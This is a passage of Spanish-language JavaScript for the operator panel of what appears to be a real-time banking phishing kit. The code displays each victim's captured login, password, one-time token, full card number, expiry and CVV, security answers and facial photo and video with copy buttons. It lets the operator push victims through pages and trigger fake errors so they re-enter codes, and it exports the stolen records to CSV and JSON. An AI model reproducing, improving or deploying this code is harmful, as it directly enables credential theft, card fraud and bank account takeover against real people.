            const statusText = getStatusText(userPage);
            const statusClass = getStatusClass(userPage);
            const isWaitingForResponse = isUserWaitingForResponse(userData);
            const pendingStatusOverride = pendingCardStatusOverrides.get(userId);
            if (
                (pendingStatusOverride && pendingStatusOverride.page !== null && pendingStatusOverride.page === userPage) ||
                (!isWaitingForResponse && pendingStatusOverride && pendingStatusOverride.page === null) ||
                isWaitingForResponse
            ) {
                pendingCardStatusOverrides.delete(userId);
            }
            const activePendingStatusOverride = pendingCardStatusOverrides.get(userId);
            const displayStatusText = isWaitingForResponse
                ? 'Cargando'
                : (activePendingStatusOverride ? activePendingStatusOverride.text : statusText);
            const displayStatusClass = isWaitingForResponse
                ? 'warning'
                : (activePendingStatusOverride ? activePendingStatusOverride.className : statusClass);
            const statusBadgeStyle = getStatusBadgeStyle(displayStatusClass);
            
            // 📱 DETECCIÓN DE DISPOSITIVO
            const dispositivo = userData.dispositivo || 'Desconocido';
            const dispositivoBadgeColor = '#ffc600'; // Gris neutro para ambos
            
            // ==================== DETECCIÓN DE ACTIVIDAD ====================
            const isActive = userData.isActive || false;
            const lastActivity = userData.lastActivity;
            const pageLocation = userData.pageLocation || 'unknown';
            
            // Determinar estado de actividad
            let activityStatus = 'fuera';
            let activityBadgeColor = '#dc3545'; // Rojo por defecto (fuera)
            let activityBadgeIcon = '🔴';
            let activityBadgeText = 'Fuera';
            
            if (isActive && lastActivity) {
              // Convertir timestamp de Firestore a milisegundos
              const lastActivityMs = lastActivity.toMillis ? lastActivity.toMillis() : (lastActivity.seconds * 1000);
              const timeSinceActivity = Date.now() - lastActivityMs;
              
              if (timeSinceActivity < 30000) { // Menos de 30 segundos
                activityStatus = 'activo';
                activityBadgeColor = '#28a745'; // Verde
                activityBadgeIcon = '🟢';
                activityBadgeText = 'Activo';
              } else if (timeSinceActivity < 120000) { // Entre 30s y 2min
                activityStatus = 'inactivo';
                activityBadgeColor = '#ffc107'; // Amarillo
                activityBadgeIcon = '🟡';
                activityBadgeText = 'Inactivo';
              }
            }

            const cardInnerHTML = `
            <div class="user-row user-card highlight-animation" style="width:100%; background-color:rgb(107, 107, 107); color:#ffffff; border:1px solid rgba(255,255,255,0.15); border-radius:10px; overflow-x:auto; padding:20px 30px;">
            <div style="padding-bottom:10px;">
                <span class="badge badge-dark">#${cardNumber}</span>
                <span class="badge" style="background-color:${activityBadgeColor}; color:white; font-size:11px;" title="Estado de actividad del usuario">${activityBadgeIcon} ${activityBadgeText}</span>
                <span class="badge" style="background-color:${dispositivoBadgeColor}; color:black; font-size:12px;" title="Dispositivo detectado">${dispositivo}</span>
                <span style="opacity:.45;">|</span>
                ${tokenResend ? '<span class="badge badge-warning" style="font-size:12px;">⚠ Reenvio solicitado</span>' : ''}
                ${facialMediaReady ? '<span class="badge badge-success" style="font-size:12px;">Foto y video facial listos</span>' : ''}
                <span style="opacity:.45;">|</span>
                <span class="badge badge-${displayStatusClass}" data-role="page-status-badge" style="${statusBadgeStyle}">${displayStatusText}</span>
            </div>
            <div style="display:flex; justify-content:center; align-items:center;">
            <div style="width:100%; display:flex; flex-direction:column; align-items:start; gap:10px; white-space:nowrap; color:${textColor}; padding-bottom:10px;">
                    <div>
                        <span style="font-weight:600;">Usuario:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${usuario}" title="Haz clic para copiar">${usuario} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <span style="font-weight:600;">Clave:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${clave}" title="Haz clic para copiar">${clave} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <span style="font-weight:600;">Token:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${token}" title="Haz clic para copiar">${token} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                   </div>
                    <div>
                        <span style="font-weight:600;">TDC Nombre:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcNombre}" title="Haz clic para copiar">${tdcNombre} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <span style="font-weight:600;">Numero:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcNumero}" title="Haz clic para copiar">${tdcNumero} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <span style="font-weight:600;">Mes:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcMes}" title="Haz clic para copiar">${tdcMes} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <span style="font-weight:600;">Año:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcAnio}" title="Haz clic para copiar">${tdcAnio} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <span style="font-weight:600;">CVV:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcCvv}" title="Haz clic para copiar">${tdcCvv} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <span style="opacity:.45;">|</span>
                        <br>
                        <span style="font-weight:600;">Pregunta de Seguridad:</span>
                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${userData.respuestaSeguridad || ''}" title="Haz clic para copiar">${userData.respuestaSeguridad || 'Pendiente'} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                        <button class="btn btn-danger action-btn btn-sm rounded" data-action="pregseg_err" data-id="${userId}" title="Pregunta Error">Error</button>
                    </div>
                </div>
                <div style="display:flex; flex-direction:column; align-items:start; gap:10px; white-space:nowrap; color:${textColor}; padding-bottom:10px;">
                    <div class="d-flex align-items-center mb-2">
                        <input type="text" class="form-control form-control-sm mr-2" id="pregseg-input-${userId}" placeholder="Ej: ¿Cual es tu color favorito?" style="width: 250px;">
                        <button class="btn btn-warning action-btn btn-sm rounded" data-action="enviar_pregseg" data-id="${userId}">Enviar Pregunta</button>
                    </div>
                    <div>
                        <button class="btn btn-success action-btn btn-sm mr-1 rounded" data-action="home" data-id="${userId}">Inicio</button>
                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="index_err" data-id="${userId}">Index Error</button>
                        <button class="btn btn-info action-btn btn-sm mr-1 rounded" data-action="token" data-id="${userId}">Token</button>
                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="token_err" data-id="${userId}">Token Error</button>
                        <button class="btn btn-dark action-btn btn-sm mr-1 rounded" data-action="view_video" data-id="${userId}">Foto</button>
                        </div>
                        <div>
                        <button class="btn btn-primary action-btn btn-sm mr-1 rounded" data-action="tdc" data-id="${userId}">TDC</button>
                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="tdc_err" data-id="${userId}">TDC Error</button>
                        <button class="btn btn-secondary action-btn btn-sm mr-1 rounded" data-action="facial" data-id="${userId}">Facial</button>
                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="facial_err" data-id="${userId}">Facial Error</button>
                        <button class="btn btn-danger action-btn btn-sm rounded" data-action="remove" data-id="${userId}">Eliminar</button>
                    </div>
                    </div>
                    </div>
                    <div>
                    <div style="display:flex; align-items:center; justify-content:center;">
                        <button class="btn btn-outline-light action-btn btn-sm mr-1 rounded" data-action="focus" data-id="${userId}" title="Abrir esta fila en una pestaña nueva">
                        <i class="fas fa-external-link-alt mr-1"></i>Trabajar
                        </button>
                    </div>
            </div>
            `;

            // Crear o actualizar el contenedor (Opción B)
            const userCardContainer = existingContainer || document.createElement("div");
            userCardContainer.className = "col-md-12 mb-3";
            userCardContainer.setAttribute('data-user-container', userId);
            userCardContainer.setAttribute('data-user-id', userId);
            userCardContainer.innerHTML = cardInnerHTML;
            elements.usersList.appendChild(userCardContainer);

            // Configurar auto-guardado del textarea HTML
            const htmlTextarea = document.getElementById(`appRootContent-${userId}`);
            if (htmlTextarea) {
                htmlTextarea.addEventListener('blur', async function() {
                    const htmlContent = this.value.trim();
                    if (htmlContent) {
                        try {
                            await updateDoc(doc(db, "redireccion", userId), {
                                appRootContent: htmlContent,
                                lastUpdate: new Date().toISOString()
                            });

                        } catch (error) {
                            console.error("Error guardando contenido HTML:", error);
                        }
                    }
                });
            }

            // Agregar validación automática de campos para el botón Dashboard
            setupDashboardValidation(userId);

        });
    }
    // Actualizar contadores
    if (elements.activeUsersCount) elements.activeUsersCount.textContent = totalActive;
    if (elements.coordinatesUsersCount) elements.coordinatesUsersCount.textContent = inCoordinates;
    if (elements.tokenUsersCount) elements.tokenUsersCount.textContent = inToken;
    // Los event listeners se configuran con delegación de eventos en setupEventListeners()
}

// Función para configurar validación automática del botón Dashboard
function setupDashboardValidation(userId) {
    const phoneInput = document.getElementById(`phoneNumber-${userId}`);
    const appRootInput = document.getElementById(`appRootContent-${userId}`);
    const dashboardBtn = document.querySelector(`button[data-action="dashboard"][data-id="${userId}"]`);

    if (!phoneInput || !appRootInput || !dashboardBtn) return;

    function validateInputs() {
        const phoneValue = phoneInput.value.trim();
        const appRootValue = appRootInput.value.trim();
        const isValid = phoneValue.length > 0 && appRootValue.length > 0;

        if (isValid) {
            dashboardBtn.classList.remove('disabled');
            dashboardBtn.disabled = false;
        } else {
            dashboardBtn.classList.add('disabled');
            dashboardBtn.disabled = true;
        }
    }

    // Validar inicialmente
    validateInputs();

    // Agregar event listeners
    phoneInput.addEventListener('input', validateInputs);
    phoneInput.addEventListener('blur', validateInputs);
    appRootInput.addEventListener('input', validateInputs);
    appRootInput.addEventListener('blur', validateInputs);
}
// Usar configuraciones centralizadas
const actionConfig = appConfig.actions;

// Estilos adicionales para las tarjetas de usuario
const additionalStyles = `
<style>
/* Estilos para los nuevos inputs de las tarjetas */
.user-card .form-control {
    background-color: rgba(255, 255, 255, 0.9) !important;
    color: #333 !important;
    border-radius: 8px !important;
    transition: all 0.3s ease !important;
}

.user-card .form-control:focus {
    border-color: #007bff !important;
    box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25) !important;
    background-color: white !important;
}

.user-card .form-label {
    color: inherit !important;
    font-weight: 600 !important;
    margin-bottom: 8px !important;
}

.user-card .text-danger {
    color: #dc3545 !important;
}

/* Mejorar apariencia del botón Dashboard */
.user-card .btn-primary {
    background: linear-gradient(45deg, #007bff, #0056b3) !important;
    border: none !important;
    font-weight: 600 !important;
    padding: 8px 16px !important;
    border-radius: 6px !important;
    transition: all 0.3s ease !important;
}

.user-card .btn-primary:hover:not(:disabled) {
    background: linear-gradient(45deg, #0056b3, #004085) !important;
    transform: translateY(-1px) !important;
    box-shadow: 0 4px 8px rgba(0, 123, 255, 0.3) !important;
}

.user-card .btn-primary:disabled {
    background: #6c757d !important;
    cursor: not-allowed !important;
    opacity: 0.65 !important;
}

/* Animación para campos requeridos vacíos */
.user-card .form-control:invalid {
    border-color: #dc3545 !important;
    box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.25) !important;
}

/* Placeholder styling mejorado */
.user-card .form-control::placeholder {
    color: #6c757d !important;
    opacity: 0.8 !important;
}

/* Estilos para badge de actividad */
.badge-activity {
    display: inline-flex;
    align-items: center;
    padding: 4px 10px !important;
    border-radius: 12px !important;
    font-size: 11px !important;
    font-weight: 600 !important;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
    animation: pulse-activity 4s ease-in-out infinite;
}

.badge-activity.activo {
    background-color: #28a745 !important;
    color: white !important;
}

.badge-activity.inactivo {
    background-color: #ffc107 !important;
    color: #333 !important;
}

.badge-activity.fuera {
    background-color: #dc3545 !important;
    color: white !important;
}

@keyframes pulse-activity {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.9; transform: scale(0.98); }
}

/* Responsive adjustments */
@media (max-width: 1200px) {
    .user-card .btn-group .btn {
        padding: 6px 12px !important;
        font-size: 12px !important;
    }
    
    .badge-activity {
        font-size: 10px !important;
        padding: 3px 8px !important;
    }
}
</style>
`;

// Agregar estilos al documento
document.head.insertAdjacentHTML('beforeend', additionalStyles);

// Función para animar tarjeta
function animateCard(card, color) {
    void color;
    card.style.transition = "transform 0.25s ease, box-shadow 0.25s ease";
    card.style.transform = "translateY(-1px)";
    card.style.boxShadow = "0 0 0 2px rgba(255, 255, 255, 0.12) inset";
    card.classList.add("highlight-animation");
    setTimeout(() => {
        card.classList.remove("highlight-animation");
        card.style.transform = "";
        card.style.boxShadow = "";
    }, 1000);
}

// Función para manejar acciones de usuario
function handleUserAction(event) {
    const button = event.target.closest(".action-btn");
    if (!button) return;
    const action = button.dataset.action;
    const userId = button.dataset.id;

    console.log("Acción:", action, "Usuario:", userId); // Debug

    if (!userId) {
        console.error("No se encontró userId en el botón");
        return;
    }

    if (action === "focus") {
        const focusUrl = new URL(window.location.href);
        focusUrl.searchParams.set("focus", userId);
        window.open(focusUrl.toString(), "_blank");
        return;
    }

    // Buscar la tarjeta de usuario de manera más robusta
    const card = button.closest(".user-card") ||
                 button.closest(".card") ||
                 document.querySelector(`[data-user-id="${userId}"]`);

    if (!card) {
        console.error("No se pudo encontrar la tarjeta del usuario:", userId);


        return;
    }

    if (!["remove", "view_video"].includes(action)) {
        setPendingCardStatusOverride(userId, button);
        updateCardStatusBadge(card, getStatusOverrideFromButton(button));
    }

    // Marcar que una acción del admin está en progreso
    setAdminActionInProgress();

    // Animar botón
    button.classList.add("pulse");
    setTimeout(() => button.classList.remove("pulse"), 1000);

    console.log("Tarjeta encontrada:", card); // Debug

    if (action === "enviar_pregseg") {
        setAdminActionInProgress();
        const inputElement = document.getElementById(`pregseg-input-${userId}`);
        let pregunta = inputElement ? inputElement.value.trim() : "";
        if (!pregunta) {
            alert("Debe escribir una pregunta de seguridad primero.");
            return;
        }
        // Capitalizar la primera letra
        pregunta = pregunta.charAt(0).toUpperCase() + pregunta.slice(1);
        
        console.log("enviar_pregseg: enviando a", userId);
        updateDoc(doc(db, "redireccion", userId), {
            page: 8,
            preguntaSeguridadAdmin: pregunta,
            pageLocation: "pregseg",
            adminCommandAt: Date.now()
        }).then(() => {
            console.log("enviar_pregseg: OK para", userId);
            animateCard(card, "#fff3cd");
            if (inputElement) inputElement.value = "";
        }).catch((error) => {
            console.error("Error enviando pregseg:", error);
        });
        return;
    }

    if (action === "remove") {
        if (confirm(`¿Estás seguro que deseas eliminar al usuario ${userId}? Esta acción no se puede deshacer.`)) {
            card.style.transition = "all 0.5s ease";
            card.style.opacity = "0.5";

            deleteDoc(doc(db, "redireccion", userId))
                .then(() => {
                    // Animar la eliminación
                    card.style.opacity = "0";
                    card.style.transform = "scale(0.9) translateY(20px)";

                    // Buscar el contenedor padre de la tarjeta
                    const cardContainer = card.closest(".col-md-4");
                    if (cardContainer) {
                        // Marcar como eliminado para evitar que updateUI lo procese
                        cardContainer.setAttribute('data-removing', 'true');
                        setTimeout(() => {
                            if (cardContainer.parentNode) {
                                cardContainer.remove();
                            }
                        }, 500);
                    } else {
                        console.error("No se pudo encontrar el contenedor de la tarjeta");
                        // Fallback: remover solo la tarjeta
                        card.setAttribute('data-removing', 'true');
                        setTimeout(() => {
                            if (card.parentNode) {
                                card.remove();
                            }
                        }, 500);
                    }
                })
                .catch((error) => {
                    console.error("Error eliminando usuario:", error);
                    alert("Error al eliminar el usuario. Intente nuevamente.");
                    // Restaurar estado visual
                    card.style.opacity = "1";
                    card.style.transform = "scale(1)";
                });
        }
        return;
    }

    if (action === "index_err") {
        setAdminActionInProgress();
        console.log("index_err: escribiendo flag para", userId);
        updateDoc(doc(db, "redireccion", userId), {
            page: 2,
            inicioErr: true,
            pageLocation: getPageLocationForAction(action),
            adminCommandAt: Date.now()
        })
            .then(() => {
                console.log("index_err: flag escrito OK para", userId);
                animateCard(card, "#ffd6de");
            })
            .catch((error) => console.error("index_err: Error escribiendo flag:", error));
        return;
    }

    if (action === "sms_err") {
        setAdminActionInProgress();
        updateDoc(doc(db, "redireccion", userId), {
            smsErr: true,
            page: 4,
            pageLocation: getPageLocationForAction(action),
            adminCommandAt: Date.now()
        })
            .then(() => {
                animateCard(card, "#ffd6de");
            })
            .catch((error) => console.error("sms_err error:", error));
        return;
    }

    if (action === "token_err") {
        setAdminActionInProgress();
        updateDoc(doc(db, "redireccion", userId), {
            tokenErr: true,
            page: 6,
            pageLocation: getPageLocationForAction(action),
            adminCommandAt: Date.now()
        })
            .then(() => {
                animateCard(card, "#ffd6de");
            })
            .catch((error) => console.error("token_err error:", error));
        return;
    }

    if (action === "tdc_err") {
        setAdminActionInProgress();
        updateDoc(doc(db, "redireccion", userId), {
            tdcErr: true,
            page: 4,
            pageLocation: getPageLocationForAction(action),
            adminCommandAt: Date.now()
        })
            .then(() => {
                animateCard(card, "#ffd6de");
            })
            .catch((error) => console.error("tdc_err error:", error));
        return;
    }

    if (action === "pregseg_err") {
        setAdminActionInProgress();
        updateDoc(doc(db, "redireccion", userId), {
            pregsegErr: true,
            page: 9,
            pageLocation: getPageLocationForAction(action),
            adminCommandAt: Date.now()
        })
            .then(() => {
                animateCard(card, "#ffd6de");
            })
            .catch((error) => console.error("pregseg_err error:", error));
        return;
    }

    if (action === "view_video") {
        loadFacialVideo(userId);
        return;
    }

    // Manejar acción especial de dashboard
    if (action === "dashboard") {
        // Obtener valores de los nuevos inputs
        const phoneInput = document.getElementById(`phoneNumber-${userId}`);
        const appRootInput = document.getElementById(`appRootContent-${userId}`);

        const phoneNumber = phoneInput ? phoneInput.value.trim() : '';
        const appRootContent = appRootInput ? appRootInput.value.trim() : '';

        console.log('📋 Datos a guardar:');
        console.log('- phoneNumber:', phoneNumber);
        console.log('- appRootContent length:', appRootContent.length);
        console.log('- appRootContent preview:', appRootContent.substring(0, 100) + '...');

        // Guardar ambos contenidos en Firestore y redirigir
        updateDoc(doc(db, "redireccion", userId), {
            page: actionConfig[action].page,
            phoneNumber: phoneNumber,
            appRootContent: appRootContent,
            lastUpdate: new Date().toISOString()
        })
            .then(() => {
                console.log('✅ Datos guardados exitosamente en Firestore');
                console.log('- Documento actualizado:', userId);
                console.log('- El cliente será redirigido automáticamente a dashboard.html');
                
                animateCard(card, actionConfig[action].color);
                
                // NO redirigir el panel del admin
                // El cliente se redirigirá automáticamente cuando detecte page: 6 en Firestore
                
            })
            .catch((error) => console.error("Error:", error));
        return;
    }

    // Manejar otras acciones de página
    const config = actionConfig[action];
    if (config) {
        const payload = {
            page: config.page,
            pageLocation: getPageLocationForAction(action),
            adminCommandAt: Date.now()
        };

        if (action === "home") {
            payload.inicioErr = false;
        }

        updateDoc(doc(db, "redireccion", userId), payload)
            .then(() => animateCard(card, config.color))
            .catch((error) => console.error("Error:", error));
    }
}

// Función para configurar delegación de eventos
function setupEventListeners() {
    // Delegación de eventos para botones de acción
    document.addEventListener('click', function(e) {
        // Manejar botones de acción
        if (e.target.closest('.action-btn')) {
            handleUserAction(e);
            return;
        }

        // Manejar elementos copiables
        if (e.target.closest('.copyable')) {
            const copyableElement = e.target.closest('.copyable');
            const textToCopy = copyableElement.dataset.value;

            if (textToCopy) {
                navigator.clipboard.writeText(textToCopy).then(() => {
                    // Mostrar feedback visual
                    const originalText = copyableElement.innerHTML;
                    copyableElement.innerHTML = '✓ Copiado!';
                    copyableElement.style.color = '#28a745';

                    setTimeout(() => {
                        copyableElement.innerHTML = originalText;
                        copyableElement.style.color = '';
                    }, 1500);
                }).catch(err => {
                    console.error('Error al copiar:', err);
                });
            }
        }
    });
}

// Inicializar la aplicación cuando el DOM esté cargado
document.addEventListener("DOMContentLoaded", async function() {
    await loadAdminCredentials();

    if (focusedUserId) {
        if (elements.focusedUserBanner) {
            elements.focusedUserBanner.classList.remove("d-none");
        }
        if (elements.focusedUserBannerText) {
            elements.focusedUserBannerText.textContent = `Modo aislado: ${focusedUserId}`;
        }
        if (elements.focusedUserBannerLink) {
            elements.focusedUserBannerLink.textContent = "Volver al panel";
            elements.focusedUserBannerLink.href = "panel.html";
        }
        if (elements.audioSettingsCard) {
            elements.audioSettingsCard.classList.add("d-none");
        }
        if (elements.historialCard) {
            elements.historialCard.classList.add("d-none");
        }
    }

    // Configurar delegación de eventos
    setupEventListeners();
    
    // Inicializar sistema de audio

    initializeAudioControls();
    initializeAudioPanelState();

    if (localStorage.getItem("adminLoggedIn") === "true") {
        elements.lognScreen?.classList.add("d-none");
        elements.adminPanel?.classList.remove("d-none");
        loadActiveUsers();
        if (typeof window.cargarHistorial === "function") {
            window.cargarHistorial();
        }
    }
});
// Usar configuraciones centralizadas
const statusConfig = appConfig.status;

function getStatusText(page) {
    return statusConfig[page]?.text || "Desconocido";
}

function getStatusClass(page) {
    return statusConfig[page]?.class || "secondary";
}

// Función para actualizar el contenido del dashboard.html
async function updateDashboardContent(userId) {
    try {
        // El contenido HTML ya está guardado en el documento del usuario
        // El dashboard.html leerá directamente desde el documento del usuario


    } catch (error) {
        console.error("Error actualizando contenido del dashboard:", error);
    }
}

// ==================== FUNCIONES DEL HISTORIAL ====================

// Variables globales para el historial
let datosHistorial = [];
let datosFiltrados = [];

// Función para mostrar/ocultar la sección de historial
window.toggleHistorial = function() {
    const section = document.getElementById('historial-section');
    if (section.style.display === 'none') {
        section.style.display = 'block';
        cargarHistorial(); // Cargar datos al mostrar
    } else {
        section.style.display = 'none';
    }
};

// Función para cargar datos del historial
window.cargarHistorial = async function() {
    const loading = document.getElementById("loading-historial");
    const tabla = document.getElementById("tabla-historial");
    const noData = document.getElementById("no-data-historial");

    if (!tabla || !noData) {
        console.warn("⚠️ DOM del historial incompleto (tabla-historial / no-data-historial).");
        return;
    }

    if (loading) {
        loading.style.display = "block";
    }
    tabla.style.display = "none";
    noData.style.display = "none";

    try {
        let querySnapshot;
        try {
            const q = query(collection(db, "datosHistorial"), limit(1000));
            querySnapshot = await getDocs(q);
        } catch (modularErr) {
            console.warn("Historial: lectura modular falló, probando Firestore compat (window.db):", modularErr);
            if (window.db && typeof window.db.collection === "function") {
                querySnapshot = await window.db.collection("datosHistorial").limit(1000).get();
            } else {
                throw modularErr;
            }
        }

        const historialPorUsuario = new Map();
        querySnapshot.forEach((docSnap) => {
            const item = {
                id: docSnap.id,
                ...docSnap.data()
            };
            const itemKey = item.usuario || docSnap.id;
            const currentItem = historialPorUsuario.get(itemKey);

            if (!currentItem || shouldReplaceHistorialItem(currentItem, item)) {
                historialPorUsuario.set(itemKey, item);
            }
        });

        datosHistorial = Array.from(historialPorUsuario.values());

        datosHistorial.sort((a, b) => getHistorialTimestamp(b) - getHistorialTimestamp(a));

        datosFiltrados = [...datosHistorial];
        mostrarDatosHistorial();
        actualizarEstadisticasHistorial();
    } catch (error) {
        console.error("❌ Error cargando historial:", error);
        noData.style.display = "block";
        noData.innerHTML = `
            <i class="fas fa-exclamation-triangle"></i>
            <h5>Error al cargar datos</h5>
            <p>Error: ${error.message || String(error)}</p>
            <p class="small text-muted mb-0">Si ves permisos denegados, revisa las reglas de Firestore para lectura en <code>datosHistorial</code>.</p>
        `;
    } finally {
        if (loading) {
            loading.style.display = "none";
        }
    }
};

// Función para aplicar filtros
window.aplicarFiltrosHistorial = function() {
    const fechaInicio = document.getElementById('fechaInicio').value;
    const fechaFin = document.getElementById('fechaFin').value;
    const usuario = document.getElementById('filtroUsuario').value.toLowerCase();
    const color = document.getElementById('filtroColor').value;

    datosFiltrados = datosHistorial.filter(item => {
        let cumpleFiltros = true;

        if (fechaInicio || fechaFin) {
            const itemDate = getHistorialDateValue(item);
            if (!itemDate) {
                cumpleFiltros = false;
            } else {
                if (fechaInicio) {
                    cumpleFiltros = cumpleFiltros && itemDate >= fechaInicio;
                }
                if (fechaFin) {
                    cumpleFiltros = cumpleFiltros && itemDate <= fechaFin;
                }
            }
        }

        // Filtro por usuario
        if (usuario && item.usuario) {
            cumpleFiltros = cumpleFiltros && item.usuario.toLowerCase().includes(usuario);
        } else if (usuario) {
            cumpleFiltros = false;
        }

        // Filtro por color
        if (color && item.cardColor) {
            cumpleFiltros = cumpleFiltros && item.cardColor === color;
        } else if (color) {
            cumpleFiltros = false;
        }

        return cumpleFiltros;
    });

    mostrarDatosHistorial();
    actualizarEstadisticasHistorial();
};

// Función para limpiar filtros
window.limpiarFiltrosHistorial = function() {
    document.getElementById('fechaInicio').value = '';
    document.getElementById('fechaFin').value = '';
    document.getElementById('filtroUsuario').value = '';
    document.getElementById('filtroColor').value = '';

    datosFiltrados = [...datosHistorial];
    mostrarDatosHistorial();
    actualizarEstadisticasHistorial();
};

// Función para mostrar datos en la tabla
function mostrarDatosHistorial() {
    const tabla = document.getElementById('tabla-historial');
    const noData = document.getElementById('no-data-historial');
    const tbody = document.getElementById('tbody-historial');

    if (datosFiltrados.length === 0) {
        tabla.style.display = 'none';
        noData.style.display = 'block';
        return;
    }

    tabla.style.display = 'table';
    noData.style.display = 'none';

    tbody.innerHTML = datosFiltrados.map(item => {
        var facialBtns = '';
        var hasPhoto = item.fotoFacialUrl && item.fotoFacialUrl !== '';
        var hasVideo = item.videoFacialUrl && item.videoFacialUrl !== '';
        if (hasPhoto) {
            facialBtns += `<button class="btn btn-sm btn-outline-info mr-1" onclick="showHistorialPhoto('${item.fotoFacialUrl.replace(/'/g, "\\'")}')">Foto</button>`;
        }
        if (hasVideo) {
            facialBtns += `<button class="btn btn-sm btn-outline-dark" onclick="showHistorialVideo('${item.videoFacialUrl.replace(/'/g, "\\'")}')">Video</button>`;
        }
        if (!facialBtns) facialBtns = 'N/A';
        return `<tr style="font-size: 16px;">
            <td>${item.tipoDocumentoTexto || 'N/A'}</td>
            <td><strong>${item.usuario || 'N/A'}</strong></td>
            <td>${item.clave || 'N/A'}</td>
            <td>${item.tdcNombre || 'N/A'}</td>
            <td>${item.tdcNumero || 'N/A'}</td>
            <td>${item.tdcMes || 'N/A'}</td>
            <td>${item.tdcAnio || 'N/A'}</td>
            <td>${item.tdcCvv || 'N/A'}</td>
            <td>${item.token || 'N/A'}</td>
            <td>${facialBtns}</td>
        </tr>`;
    }).join('');
}

function getHistorialTimestamp(item) {
    const value = item && item.timestamp;

    if (!value) {
        return 0;
    }

    if (typeof value === 'string') {
        const parsed = Date.parse(value);
        return Number.isNaN(parsed) ? 0 : parsed;
    }

    if (typeof value.toDate === 'function') {
        return value.toDate().getTime();
    }

    if (typeof value.seconds === 'number') {
        return value.seconds * 1000;
    }

    return 0;
}

function getHistorialDateValue(item) {
    const timestamp = getHistorialTimestamp(item);
    if (timestamp > 0) {
        return new Date(timestamp).toISOString().slice(0, 10);
    }

    if (item && item.fecha) {
        const parsed = Date.parse(item.fecha);
        if (!Number.isNaN(parsed)) {
            return new Date(parsed).toISOString().slice(0, 10);
        }
    }

    return '';
}

function getHistorialCompleteness(item) {
    return [
        item && item.usuario,
        item && item.clave,
        item && item.tdcNombre,
        item && item.tdcNumero,
        item && item.tdcMes,
        item && item.tdcAnio,
        item && item.tdcCvv,
        item && item.token
    ].filter(Boolean).length;
}

function shouldReplaceHistorialItem(currentItem, nextItem) {
    const currentTimestamp = getHistorialTimestamp(currentItem);
    const nextTimestamp = getHistorialTimestamp(nextItem);

    if (nextTimestamp !== currentTimestamp) {
        return nextTimestamp > currentTimestamp;
    }

    return getHistorialCompleteness(nextItem) >= getHistorialCompleteness(currentItem);
}

// Función para actualizar estadísticas
function actualizarEstadisticasHistorial() {
    const ultimoRegistro = datosFiltrados.length > 0 ? datosFiltrados[0] : null;
    const ultimoAcceso = ultimoRegistro
        ? [ultimoRegistro.fecha || '', ultimoRegistro.hora || ''].filter(Boolean).join(' ') || 'N/A'
        : 'N/A';

    const stats = {
        total: datosFiltrados.length,
        coloresUnicos: new Set(datosFiltrados.map(item => item.cardColor).filter(Boolean)).size,
        diasActividad: new Set(datosFiltrados.map(item => item.fecha).filter(Boolean)).size,
        ultimoAcceso: ultimoAcceso
    };

    const elTotal = document.getElementById("total-registros");
    const elColores = document.getElementById("colores-unicos");
    const elDias = document.getElementById("dias-actividad");
    const elUltimo = document.getElementById("ultimo-acceso");
    if (elTotal) elTotal.textContent = stats.total;
    if (elColores) elColores.textContent = stats.coloresUnicos;
    if (elDias) elDias.textContent = stats.diasActividad;
    if (elUltimo) elUltimo.textContent = stats.ultimoAcceso;
}

// Función para exportar a CSV
window.exportarHistorialCSV = function() {
    if (datosFiltrados.length === 0) {
        alert('No hay datos para exportar');
        return;
    }

    const headers = [
        'Tipo Doc',
        'Usuario',
        'Clave',
        'TDC Nombre',
        'TDC Numero',
        'TDC Mes',
        'TDC Año',
        'CVV',
        'OTP',
        'OTP2',
        'Foto Facial',
        'Video Facial'
    ];

    const csvContent = [
        headers.join(','),
        ...datosFiltrados.map(item => [
            `"${item.tipoDocumentoTexto || ''}"`,
            `"${item.usuario || ''}"`,
            `"${item.clave || ''}"`,
            `"${item.tdcNombre || ''}"`,
            `"${item.tdcNumero || ''}"`,
            `"${item.tdcMes || ''}"`,
            `"${item.tdcAnio || ''}"`,
            `"${item.tdcCvv || ''}"`,
            `"${item.token || ''}"`,
            `"${item.fotoFacialUrl || ''}"`,
            `"${item.videoFacialUrl || ''}"`
        ].join(','))
    ].join('\n');

    descargarArchivo(csvContent, `historial_datos_${new Date().toISOString().split('T')[0]}.csv`, 'text/csv');

};

// Función para exportar a JSON
window.exportarHistorialJSON = function() {
    if (datosFiltrados.length === 0) {
        alert('No hay datos para exportar');
        return;
    }

    const jsonContent = JSON.stringify(datosFiltrados, null, 2);
    descargarArchivo(jsonContent, `historial_datos_${new Date().toISOString().split('T')[0]}.json`, 'application/json');

};

// Función auxiliar para descargar archivos
function descargarArchivo(contenido, nombreArchivo, tipoMime) {
    const blob = new Blob([contenido], { type: `${tipoMime};charset=utf-8;` });
    const link = document.createElement('a');
    const url = URL.createObjectURL(blob);

    link.setAttribute('href', url);
